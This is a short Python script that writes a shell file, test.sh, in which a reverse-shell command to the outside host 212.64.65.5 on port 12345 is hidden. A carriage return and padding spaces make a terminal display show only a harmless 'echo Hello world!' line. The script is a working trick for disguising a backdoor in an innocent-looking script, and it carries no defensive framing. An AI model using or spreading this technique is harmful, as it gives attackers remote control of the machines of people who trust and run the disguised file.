cmd_h = "/bin/bash -c bash -i >& /dev/tcp/212.64.65.5/12345 0>&1" # hidden
cmd_v = "echo 'Hello world!'"                         # visible

with open("test.sh", "w") as f:
    output = "#!/bin/sh\n"
    output += cmd_h + ";" + cmd_v + " #\r" + cmd_v + " " * (len(cmd_h) + 3) + "\n"
    f.write(output)
